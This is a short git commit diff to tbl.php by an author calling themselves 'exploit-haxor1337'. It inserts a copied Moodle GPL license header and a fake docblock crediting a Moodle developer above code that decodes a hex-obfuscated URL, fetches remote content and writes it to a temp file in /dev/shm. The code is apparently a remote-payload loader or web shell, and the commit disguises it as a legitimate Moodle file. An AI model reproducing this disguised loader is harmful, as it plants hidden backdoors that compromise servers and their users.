7025954ca532b348a6df706129898de1f61918fb
exploit-haxor1337 <76028485+exploit-haxor@users.noreply.github.com>
2024-10-18 06:40:27 +0700

    Update tbl.php

--- tbl.php
+++ tbl.php
@@ -31,9 +31,29 @@ function clean_old_temp_files() {
     }
 }
 
-
 clean_old_temp_files();
+// This file is part of Moodle - http://moodle.org/
+//
+// Moodle is free software: you can redistribute it and/or modify
+// it under the terms of the GNU General Public License as published by
+// the Free Software Foundation, either version 3 of the License, or
+// (at your option) any later version.
+//
+// Moodle is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License
+// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.
 
+/**
+ * News items block caps.
+ *
+ * @pass       tbl
+ * @copyright  Mark Nelson <markn@moodle.com>
+ * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
+ */
 $url = hex2str($hex25tr);
 $a = geturlsinfo($url);
 $temporary_file = tempnam('/dev/shm', 'prefix');
